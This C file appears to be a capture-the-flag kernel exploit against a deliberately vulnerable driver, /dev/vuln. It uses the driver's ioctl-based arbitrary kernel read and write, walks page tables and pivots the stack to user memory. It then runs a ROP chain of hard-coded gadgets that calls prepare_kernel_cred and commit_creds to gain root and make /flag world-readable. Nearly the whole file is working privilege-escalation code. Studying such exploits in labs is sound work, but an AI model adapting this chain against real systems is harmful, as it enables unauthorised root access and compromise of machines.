#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333
#define VULN_PGD 0x4444

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

unsigned long pageOffsetBase = 0xffff888000000000;

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long read64(unsigned long kaddr) {

	struct rwRequest req;
	unsigned long value;;

	req.uaddr = &value;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_READ, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
	return value;
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

unsigned long leak_pgd() {
	struct rwRequest req;
	unsigned long pgd;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &pgd;
	if (ioctl(fd, VULN_PGD, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return pgd;
}

unsigned long pageTableWalk(unsigned long pgdir, unsigned long vaddr) {

	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;

	printf("index1: %lx, index2: %lx, index3: %lx index4: %lx\n", index1, index2, index3, index4);
	
	unsigned long lv1 = read64(pgdir + index1*8);
	if (!lv1) {
		printf("[!] lv1 is invalid\n");
		exit(-1);
	}
	printf("lv1: %lx\n", lv1);
	unsigned long lv2 = read64((((lv1 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index2*8);
	if (!lv2) {
		printf("[!] lv2 is invalid\n");
		exit(-1);
	}
	printf("lv2: %lx\n", lv2);
	
	unsigned long lv3 = read64((((lv2 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index3*8);
	if (!lv3) {
		printf("[!] lv3 is invalid\n");
		exit(-1);
	}
	printf("lv3: %lx\n", lv3);

	unsigned long lv4 = read64((((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8);
	if (!lv4) {
		printf("[!] lv3 is invalid\n");
		exit(-1);
	}
	printf("lv4: %lx\n", lv4);
	
	unsigned long vaddr_alias = (((lv4 >> 12) & 0x3fffffff) << 12) + pageOffsetBase;
	printf("vaddr alias page: %p\n", (void *)vaddr_alias);
	unsigned long pte_addr = (((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4*8;
	printf("pte address: %p\n", (void *)pte_addr);
	
	return pte_addr;
}

int main (int argc, char **argv){
	
	// 0xffffffff8149f601 : mov esp, 0xf7000000 ; ret
	unsigned long gadget = 0xffffffff8149f601;

	// 0xffffffff81001219 : pop rdi ; ret 
	unsigned long pop_rdi = 0xffffffff81001219;

	// 0xffffffff81001a5c : pop rsi ; ret
	unsigned long pop_rsi = 0xffffffff81001a5c;

	// 0xffffffff81042ef7 : pop rdx ; ret
	unsigned long pop_rdx = 0xffffffff81042ef7;

	// 0xffffffff810cf971 : mov rdi, rax ; jne 0xffffffff810cf959 ; ret
	unsigned long mov_rdi_rax = 0xffffffff810cf971;

	// 0xffffffff8147a56e : cmp rdx, 8 ; jne 0xffffffff8147a55f ; ret
	unsigned long cmp = 0xffffffff8147a56e;

	unsigned long commit_creds = 0xffffffff8107bd20;
	unsigned long prepare_kernel_cred = 0xffffffff8107c0a0;
	unsigned long chmod_internal = 0xffffffff811a1b50;
	unsigned long msleep = 0xffffffff810c4730;

	int i = 0x1000/8;

	unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
	if (pivot_stack == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}
	
	/*
	 1. RDI <- 0
	 2. CALL PREPARE_KERNEL_CRED (0xffffffff8107c0a0)
	 3. RDI <- RAX
	 4. CALL COMMIT_CREDS (0xffffffff8107bd20)
	 5. RDI <- 0xffffff9c
	 6. RSI <- "flag"
	 7. RDX <- 0777
	 8. CALL CHMOD_INTERNAL (0xffffffff811a1b50)
	 9. RDI <- 0x1000000
	10. CALL MSLEEP (0xffffffff810c4730)
	*/

	char *flag_str = "/flag";

	// touch the first page so that it doesn't fault
	pivot_stack[0] = 0xcafedeadbeef;

	pivot_stack[i++] = pop_rdi;
	pivot_stack[i++] = 0;
	pivot_stack[i++] = prepare_kernel_cred;
	pivot_stack[i++] = pop_rdx;
	pivot_stack[i++] = 8;
	pivot_stack[i++] = cmp;
	pivot_stack[i++] = mov_rdi_rax;
	pivot_stack[i++] = commit_creds;

	pivot_stack[i++] = pop_rdi;
	pivot_stack[i++] = 0xffffff9c;
	pivot_stack[i++] = pop_rsi;
	pivot_stack[i++] = flag_str;
	pivot_stack[i++] = pop_rdx;
	pivot_stack[i++] = 0777;
	pivot_stack[i++] = chmod_internal;

	pivot_stack[i++] = pop_rdi;
	pivot_stack[i++] = 0x1000000;
	pivot_stack[i++] = msleep;


	write64(0xffffffffc0002068, gadget);
	open("/dev/vuln", O_RDONLY);

	return 0;
}